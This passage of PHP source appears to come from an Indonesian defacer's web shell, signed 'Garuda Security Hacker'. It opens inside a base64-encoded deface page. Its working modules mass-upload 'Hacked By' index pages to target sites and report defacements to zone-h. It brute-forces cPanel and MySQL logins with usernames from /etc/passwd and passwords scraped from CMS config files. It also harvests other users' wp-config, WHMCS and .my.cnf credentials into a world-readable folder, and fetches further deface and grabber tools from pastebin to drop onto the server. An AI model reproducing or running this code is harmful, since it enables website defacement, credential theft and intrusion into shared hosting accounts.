WYocnx8dSl7az1kb2N1bWVudC5ib2R5LmNsaWVudEhlaWdodDtsPWRvY3VtZW50LmJvZHkuY2xpZW50V2lkdGg7fWVsc2UgaWYocyl7az13aW5kb3cuaW5uZXJIZWlnaHQ7bD13aW5kb3cuaW5uZXJXaWR0aDt9dmFyIGg9YS1iO2ZvcihpPTA7aTw9ZztpKyspe29baV09MDtwW2ldPU1hdGgucmFuZG9tKCkqMTU7bltpXT0wLjAzK01hdGgucmFuZG9tKCkvMTA7altpXT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicyIraSk7altpXS5zdHlsZS5mb250RmFtaWx5PWVbeShlLmxlbmd0aCldO2pbaV0uc2l6ZT15KGgpK2I7altpXS5zdHlsZS5mb250U2l6ZT1qW2ldLnNpemU7altpXS5zdHlsZS5jb2xvcj1mW3koZi5sZW5ndGgpXTtqW2ldLnNpbms9bSpqW2ldLnNpemUvNTtpZihjPT0xKXtqW2ldLnBvc3g9eShsLWpbaV0uc2l6ZSl9aWYoYz09Mil7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSl9aWYoYz09Myl7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSkrbC80fTtpZihjPT00KXtqW2ldLnBvc3g9eShsLzItaltpXS5zaXplKStsLzJ9altpXS5wb3N5PXkoMiprLWstMipqW2ldLnNpemUpO2pbaV0uc3R5bGUubGVmdD1qW2ldLnBvc3g7altpXS5zdHlsZS50b3A9altpXS5wb3N5fXcoKX1mdW5jdGlvbiB3KCl7Zm9yKGk9MDtpPD1nO2krKyl7b1tpXSs9bltpXTtqW2ldLnBvc3krPWpbaV0uc2luaztqW2ldLnN0eWxlLmxlZnQ9altpXS5wb3N4K3BbaV0qTWF0aC5zaW4ob1tpXSk7altpXS5zdHlsZS50b3A9altpXS5wb3N5O2lmKGpbaV0ucG9zeT49ay0yKmpbaV0uc2l6ZXx8cGFyc2VJbnQoaltpXS5zdHlsZS5sZWZ0KT4obC0zKnBbaV0pKXtpZihjPT0xKXtqW2ldLnBvc3g9eShsLWpbaV0uc2l6ZSl9aWYoYz09Mil7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSl9aWYoYz09Myl7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSkrbC80fWlmKGM9PTQpe2pbaV0ucG9zeD15KGwvMi1qW2ldLnNpemUpK2wvMn1qW2ldLnBvc3k9MH19dmFyIHg9c2V0VGltZW91dCgidygpIiw1MCl9Zm9yKGk9MDtpPD1nO2krKyl7ZG9jdW1lbnQud3JpdGUoIjxzcGFuIGlkPSdzIitpKyInIHN0eWxlPSdwb3NpdGlvbjphYnNvbHV0ZTt0b3A6LSIrYSsiJz4iK2QrIjwvc3Bhbj4iKX1pZih0KXt3aW5kb3cub25sb2FkPXZ9PC9zY3JpcHQ+PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7bGVmdDozNiU7dG9wOjQ2JSI+PC9kaXY+PHN0eWxlPjwvdGV4dGFyZWE+PGJyPjwvc3R5bGU+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj4NCjxmb250IHNpemU9IjYiPjxjZW50ZXI+X1R1YW4yRmF5XyAtIFl1a2lub3NoaXRhIDQ3IC0gVE1fNDA0IDxicj4gU25vb3plIC0gTHlvbmMgLSBFN0JfNDA0IC0gRGFya1RlcnJvcml6dCA8YnI+IC4vWmVybypBbmdlbCAtIDVpTk9OIU1PVTIzIC0gTXIuWE00MDRSUyEgLSAuL1IxNV9VVEQgLSBFdmlsQ2xvd24gPGJyPiB1dHJhZ2VvdXNFbmdrdXMgLSAzNERfU0wzM1AgLSBTZWN0b3IgVi4yIC0gTXIuU3BvbmdlYm9iIDxicj5TaGFkb3dIZSpydCAtIEN5YmVyR2hvc3QuMTcgLSBBbmQgQWxsIE1lbWJlciBvZiBHYXJ1ZGEgU2VjdXJpdHkgSGFja2Vya";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done index.php<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
<form method="post">
<input type="submit" name="s" value="lol.php">
</form>
<?php
$targets = explode("\r\n", $_POST['targets']);
if($_POST['s']) {
	foreach($targets as $korba) {
		$globa = "lol.php";
		$isi_nama = "PHRpdGxlPkxvY2tlZDwvdGl0bGU+DQo8c3R5bGU+DQpib2R5ew0KdGV4dC1zaGFkb3c6MnB4IDJweCAxcHggYmx1ZTsNCn0NCmh0bWwgew0KCSBiYWNrZ3JvdW5kOiB1cmwoaHR0cHM6Ly9zY29udGVudC1zaW42LTEueHguZmJjZG4ubmV0L3YvdDEuMC0wL3M1NTJ4NDE0LzE1OTY1NTMxXzE5MTc4Nzg2MDUxMDY2MzNfODE4MDM5MjkyMzE4MzIyMzcxMF9uLmpwZz9vaD1kZDUwNGM1YTEyODU3MzFiMTQ0MDg0YWUzZGVkZDkyMSZvZT01OTExOEI2OSkgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXIgZml4ZWQ7IA0KICAtd2Via2l0LWJhY2tncm91bmQtc2l6ZTogY292ZXI7DQogIC1tb3otYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgLW8tYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgICBjb2xvcjogI2ZmZmZmZjsNCiAgICBmb250LWZhbWlseTogJ1VidW50dSc7DQoJZm9udC1zaXplOiAxM3B4Ow0KCXdpZHRoOiAxMDAlOw0KfQ0KPC9zdHlsZT4NCjxjZW50ZXI+PGZvbnQgY29sb3I9InJlZCI+PHN0cm9uZz48Zm9udCBzaXplPSI0Ij5IYWNrZWQgQnkgR2FydWRhIFNlY3VyaXR5IEhhY2tlcjwvZm9udD48L3N0cm9uZz48L2ZvbnQ+PGNlbnRlcj4NCjxzY3JpcHQ+dmFyIGc9NTAsZj1uZXcgQXJyYXkoIiNBQUFBQ0MiLCIjREREREZGIiwiI0NDQ0NERCIsIiNGM0YzRjMiLCIjRjBGRkZGIiksZT1uZXcgQXJyYXkoIkFyaWFsIEJsYWNrIiwiQXJpYWwgTmFycm93IiwiVGltZXMiLCJDb21pYyBTYW5zIE1TIiksZD0iKiIsbT0wLjYsYT0yMixiPTgsYz0xLGo9bmV3IEFycmF5KCksayxsLHgsbj1uZXcgQXJyYXkoKSxvPW5ldyBBcnJheSgpLHA9bmV3IEFycmF5KCkscT1uYXZpZ2F0b3IudXNlckFnZW50LHI9ZG9jdW1lbnQuYWxsJiZkb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmIXEubWF0Y2goL09wZXJhLykscz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmIWRvY3VtZW50LmFsbCx1PXEubWF0Y2goL09wZXJhLyksdD1yfHxzfHx1O2Z1bmN0aW9uIHkoeil7cmV0dXJuIE1hdGguZmxvb3IoeipNYXRoLnJhbmRvbSgpKX1mdW5jdGlvbiB2KCl7aWYocnx8dSl7az1kb2N1bWVudC5ib2R5LmNsaWVudEhlaWdodDtsPWRvY3VtZW50LmJvZHkuY2xpZW50V2lkdGg7fWVsc2UgaWYocyl7az13aW5kb3cuaW5uZXJIZWlnaHQ7bD13aW5kb3cuaW5uZXJXaWR0aDt9dmFyIGg9YS1iO2ZvcihpPTA7aTw9ZztpKyspe29baV09MDtwW2ldPU1hdGgucmFuZG9tKCkqMTU7bltpXT0wLjAzK01hdGgucmFuZG9tKCkvMTA7altpXT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicyIraSk7altpXS5zdHlsZS5mb250RmFtaWx5PWVbeShlLmxlbmd0aCldO2pbaV0uc2l6ZT15KGgpK2I7altpXS5zdHlsZS5mb250U2l6ZT1qW2ldLnNpemU7altpXS5zdHlsZS5jb2xvcj1mW3koZi5sZW5ndGgpXTtqW2ldLnNpbms9bSpqW2ldLnNpemUvNTtpZihjPT0xKXtqW2ldLnBvc3g9eShsLWpbaV0uc2l6ZSl9aWYoYz09Mil7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSl9aWYoYz09Myl7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSkrbC80fTtpZihjPT00KXtqW2ldLnBvc3g9eShsLzItaltpXS5zaXplKStsLzJ9altpXS5wb3N5PXkoMiprLWstMipqW2ldLnNpemUpO2pbaV0uc3R5bGUubGVmdD1qW2ldLnBvc3g7altpXS5zdHlsZS50b3A9altpXS5wb3N5fXcoKX1mdW5jdGlvbiB3KCl7Zm9yKGk9MDtpPD1nO2krKyl7b1tpXSs9bltpXTtqW2ldLnBvc3krPWpbaV0uc2luaztqW2ldLnN0eWxlLmxlZnQ9altpXS5wb3N4K3BbaV0qTWF0aC5zaW4ob1tpXSk7altpXS5zdHlsZS50b3A9altpXS5wb3N5O2lmKGpbaV0ucG9zeT49ay0yKmpbaV0uc2l6ZXx8cGFyc2VJbnQoaltpXS5zdHlsZS5sZWZ0KT4obC0zKnBbaV0pKXtpZihjPT0xKXtqW2ldLnBvc3g9eShsLWpbaV0uc2l6ZSl9aWYoYz09Mil7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSl9aWYoYz09Myl7altpXS5wb3N4PXkobC8yLWpbaV0uc2l6ZSkrbC80fWlmKGM9PTQpe2pbaV0ucG9zeD15KGwvMi1qW2ldLnNpemUpK2wvMn1qW2ldLnBvc3k9MH19dmFyIHg9c2V0VGltZW91dCgidygpIiw1MCl9Zm9yKGk9MDtpPD1nO2krKyl7ZG9jdW1lbnQud3JpdGUoIjxzcGFuIGlkPSdzIitpKyInIHN0eWxlPSdwb3NpdGlvbjphYnNvbHV0ZTt0b3A6LSIrYSsiJz4iK2QrIjwvc3Bhbj4iKX1pZih0KXt3aW5kb3cub25sb2FkPXZ9PC9zY3JpcHQ+PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7bGVmdDozNiU7dG9wOjQ2JSI+PC9kaXY+PHN0eWxlPjwvdGV4dGFyZWE+PGJyPjwvc3R5bGU+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj4NCjxmb250IHNpemU9IjYiPjxjZW50ZXI+X1R1YW4yRmF5XyAtIFl1a2lub3NoaXRhIDQ3IC0gVE1fNDA0IDxicj4gU25vb3plIC0gTHlvbmMgLSBFN0JfNDA0IC0gRGFya1RlcnJvcml6dCA8YnI+IC4vWmVybypBbmdlbCAtIDVpTk9OIU1PVTIzIC0gTXIuWE00MDRSUyEgLSAuL1IxNV9VVEQgLSBFdmlsQ2xvd24gPGJyPiB1dHJhZ2VvdXNFbmdrdXMgLSAzNERfU0wzM1AgLSBTZWN0b3IgVi4yIC0gTXIuU3BvbmdlYm9iIDxicj5TaGFkb3dIZSpydCAtIEN5YmVyR2hvc3QuMTcgLSBBbmQgQWxsIE1lbWJlciBvZiBHYXJ1ZGEgU2VjdXJpdHkgSGFja2Vy";
		$decode_isi = base64_decode($isi_nama);
		$encode = base64_encode($globa);
		$ss = fopen($globa,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' targets='_blank'>$korba</a> <br>";
		echo "Done lol.php<br>";
		$url_mkfil = "$korba?cmd=mkfile&name=$globa&targets=l1_Lw";
 		$post1 = array(
				"targets" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$globa",);
 		$output_mkfil = ngirim("$korban", $post1);
			$upload_as = ngirim("$korban?cmd=upload", $post2);
			}
		}
		} elseif($_GET['gsh'] == 'about'){
?>
<embed src="http://www.youtube.com/v/j_y3i3EHR7E&amp;autoplay=1&amp;loop=1&amp;playlist=besNDPvEwQw" type="application/x-shockwave-flash" wmode="transparent" height="1"width="1"></embed> 
	<center><br><br><img src='http://i.imgur.com/3m7leCw.jpg'>
	<br>Belajar mengalah sampai tak satupun yang dapat mengalahkan.
	<br> Keep Play With you game and keep Fun :D
	<br>tidak ada orang bodoh atau orang jago yang ada hanya kata males.
	<br>Jiwa Seorang defacer tetaplah sama :D 
	<br><font color="white"> 12-20-2016 - Tangerang</font>
	<br><br><font size="5" color="#00ff00">Tanks to:</font></center><center>
<marquee direction="up" scrollamount="2" bgcolor="" width="250" height="40"><center>
<p><b><font size="3" color="#00ff00">=[ Teman-Temanku ]=<br><br>Gabby<br>Antonio HSH<br>R10<br>w4r0x<br>edelle007<br>Brian kamikaze<br>Clover Lepex<br>
Uyap<br>Zinbad<br>FH04ZA<br>Sani marpic<br>rintoar<br>
Madan Cyber<br>Cah Bagus<br>RPG<br>Vallent<br>P4njie_a.k.a<br>Dwi Syntia<br>Ærul Ringgo's<br>Ti'ar Variabel<br>Imei7<br>Hmei7<br>De Vinclous<br>Blankon33<br>Doza Cracker<br>Ying Cracker<br>Iranian Hacker<br>Danger Hacker<br>Admin07<br>Zhou you<br>Ksatria.us<br>Cyber Inj3cti0n<br>K2ll33d<br>Sultan Haikal<br>Syntax_Error<br>Aqis<br>Black Shadow<br>crack999<br>Fnatic Crew<br>
Coretan Rizal<br>Malaikat Maut<br>Dan teman-teman ku semua<br><br>=[ grup hacking ]=<br><br>Black Newbie Team<br>3xpire Cyber Army<br>Hack Forum<br>
Indonesia Fighter Cyber<br>Biang Kerox Team<br>Anonymous<br>Gaza Hacker<br>Albanian Hacker<br>Devilz c0de<br>Muslims Cyber Shellz<br>X-Code<br>IndoXploit<br>Indonesian Security<br>Indonesia Black Cyber<br>
B-Compi<br>Jasakom<br>Mojopahit Fighter Cyber<br>Lappis<br>Mojopahit Cyber Dark<br>Crack Hack Forum<br>dan semua grup hacking<br>yang<br>saya naungi dan singgahi<br><br><br>By<br>Cyber173 a.k.a X'1n73ct<br><br><br>
</font></b></p>
</center>
</marquee>
<?php
 } elseif($_GET['gsh'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
	} elseif($_GET['gsh'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='GarudaSecurityHacker'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";

} elseif($_GET['gsh'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." <font color=lime>.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>";
	}
} elseif($_GET['gsh'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_idx_jump) {
				$user_jumping_dir = "/home/$user_idx_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='id/gsh.html=$user_jumping_dir'><font color=red>$user_jumping_dir</font></a>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='id/gsh.html=$user_jumping_dir'><font color=red>$user_jumping_dir</font></a>";
					}
					echo $jrw;
					if(function_exists('posix_getpwuid')) {
						$domain_jump = file_get_contents("/etc/named.conf");	
						if($domain_jump == '') {
							echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
						} else {
							preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
							foreach($domains_jump[1] as $dj) {
								$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
								$user_jumping_url = $user_jumping_url['name'];
								if($user_jumping_url == $user_idx_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
						}
					} else {
						echo "<br>";
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
		}
if($_GET['gsh'] == 'config') {
	$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
	$idx = mkdir("gsh_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("gsh_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_idx) {
				$user_config_dir = "/home/$user_idx/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_idx/.my.cnf" => "cpanel",
						"/home/$user_idx/.accesshash" => "WHM-accesshash",
						"/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
						"/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
						"/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
						"/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
						"/home/$user_idx/public_html/forum/config.php" => "phpBB",
						"/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
						"/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
						"/home/$user_idx/public_html/configuration.php" => "Joomla",
						"/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
						"/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
						"/home/$user_idx/public_html/wp-config.php" => "WordPress",
						"/home/$user_idx/public_html/admin/config.php" => "OpenCart",
						"/home/$user_idx/public_html/slconfig.php" => "Sitelok",
						"/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("gsh_config/$user_idx-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='id/gsh.html=$dir/gsh_config'><font color=lime>Done</font></a></center>";
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="60%" border="1" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="lime">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="lime">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br /><font color="red"></font><font color="red"></font>
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
function parah($pastebin, $nama_file){
	$usa = file_get_contents("$pastebin");
	$frr = fopen("$nama_file", 'w');
	fwrite($frr, $usa);
}
$xp = $_GET[xp];
if($xp == "config_grabber_wp_jm"){
	$config = parah("http://pastebin.com/raw.php?i=deH5eAqP", "config_wp_jm_grabber.php");
		
		$b = '<h2><a href="config_wp_jm_grabber.php" target="_blank">Config Grabber Wordpress dan joomla</a></h2><br>
		tool ini pertama ambil user dari /etc/passwd, kemudian cek apakah user Readable atau tidak, jika readable Maka akan diambil confignya';
		
}
elseif($xp == "just_jumping"){
	$jump = parah("http://pastebin.com/raw.php?i=eewrEsJY", "just_jumping.php");
		
		$b = '<h2><a href="just_jumping.php" target="_blank">Just Jumping</a></h2><br>
		tool jumping ini cuma melihat apakah user readable atau tidak menggunakan fungsi is_readable, jika readable, maka ditampilkan, <br>dan juga nama domainnya akan ditampilkan untuk mempermudah memakai tools yang lainnya.';

	}
	elseif($xp == "pepes_joomla"){
	$pepes_joomla = parah("http://pastebin.com/raw.php?i=50NQdet2", "pepes_joomla.php");
		
		$b = '<h2><a href="pepes_joomla.php" target="_blank">Auto Deface site cms Joomla</a></h2><br>
		tool ini bisa untuk auto deface jika ente tau nama sitenya, sebelumnya ambil confignya dulu <a href="?xp=config_grabber_wp_jm" target="_blank">disini</a><br>
		video: <a href="https://youtu.be/clvLy5pDA2I" target="_blank">tonton</a>';

	}
	elseif($xp == "pepes_wp"){
		$pepes_wp = parah("http://pastebin.com/raw.php?i=uQWCGPMS", "pepes_wp.php");

		$b = '<h2><a href="pepes_wp.php" target="_blank">Auto Deface site cms Wordpress</a></h2><br>
